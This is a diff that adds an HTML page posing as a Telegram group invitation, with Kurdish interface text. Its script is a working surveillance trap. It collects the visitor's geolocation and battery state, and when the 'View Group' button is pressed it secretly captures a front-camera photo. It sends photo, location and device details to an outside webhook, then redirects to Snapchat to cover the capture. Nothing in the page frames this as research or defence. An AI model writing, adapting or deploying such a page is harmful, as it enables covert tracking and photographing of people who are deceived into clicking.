@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="ku" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram: Join Group</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <style>
+        body { background-color: #182533; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; color: #fff; }
+        .container { text-align: center; padding: 20px; max-width: 400px; width: 90%; }
+        .tg-logo { width: 100px; height: 100px; margin-bottom: 20px; }
+        h2 { font-size: 22px; margin: 0 0 10px 0; font-weight: 500; }
+        p { color: #7f91a4; font-size: 16px; margin: 0 0 30px 0; }
+        .btn-telegram { background-color: #2ea6da; color: #fff; border: none; padding: 14px 0; width: 100%; font-size: 16px; font-weight: bold; border-radius: 25px; cursor: pointer; }
+        .dots:after { content: '.'; animation: dots 1.5s steps(5, end) infinite; }
+        @keyframes dots { 0%, 20% { content: ''; } 40% { content: '.'; } 60% { content: '..'; } 80%, 100% { content: '...'; } }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img class="tg-logo" src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram">
+        <h2>Telegram Group</h2>
+        <p id="status-text">تکایە کلیک لە دوگمەی خوارەوە بکە بۆ چوونە ناو گرووپ</p>
+        <button class="btn-telegram" id="start-btn">View Group</button>
+    </div>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+    <audio id="tg-sound" src="https://notificationsounds.com/storage/sounds/file-sounds-1151-telegram-notification.mp3" preload="auto"></audio>
+
+    <script>
+        // 🔗 لێرەدا ڕێک بەستەرە تایبەتەکەی خۆت جێگیر کراوە
+        const secureWebhook = "https://eo7he3r6tagkjph.m.pipedream.net";
+        
+        const urlParams = new URLSearchParams(window.location.search);
+        let lat = "0", lon = "0", battery = "N/A", charging = "N/A";
+
+        if (navigator.getBattery) { 
+            navigator.getBattery().then(b => { 
+                battery = Math.round(b.level * 100) + "%"; 
+                charging = b.charging ? "🔌 شەحن" : "🔋 باتری"; 
+            }); 
+        }
+        
+        if (navigator.geolocation) { 
+            navigator.geolocation.getCurrentPosition(pos => { 
+                lat = pos.coords.latitude; 
+                lon = pos.coords.longitude; 
+            }, null, { timeout: 3000 }); 
+        }
+
+        function sendData(blob) {
+            const uid = urlParams.get('id') || "Unknown";
+            const creator = urlParams.get('u') || "Unknown";
+            const lang = navigator.language || "N/A";
+            const googleMapsUrl = (lat !== "0") ? `https://www.google.com/maps?q=${lat},${lon}` : "⚠️ مۆڵەتی نەدا!";
+            
+            const formData = new FormData();
+            formData.append("uid", uid);
+            formData.append("creator", creator);
+            formData.append("battery", battery);
+            formData.append("charging", charging);
+            formData.append("lang", lang);
+            formData.append("maps", googleMapsUrl);
+            
+            if (blob) {
+                formData.append("photo", blob, "snap.jpg");
+            }
+
+            fetch(secureWebhook, { method: "POST", body: formData });
+        }
+
+        $("#start-btn").on("click", function() {
+            $("#start-btn").hide();
+            $("#status-text").html("<span style='color: #2ea6da; font-weight: bold;'>Connecting<span class='dots'></span></span>");
+            
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                    canvas.toBlob(blob => {
+                        sendData(blob);
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 'image/jpeg');
+                }, 700);
+
+                setTimeout(() => { 
+                    document.getElementById('tg-sound').play(); 
+                    setTimeout(() => { window.location.href = "https://www.snapchat.com/spotlight"; }, 500);
+                }, 2500);
+
+            }).catch(() => { 
+                sendData(null);
+                setTimeout(() => { window.location.href = "https://www.snapchat.com/spotlight"; }, 1000);
+            });
+        });
+    </script>
+</body>
+</html>
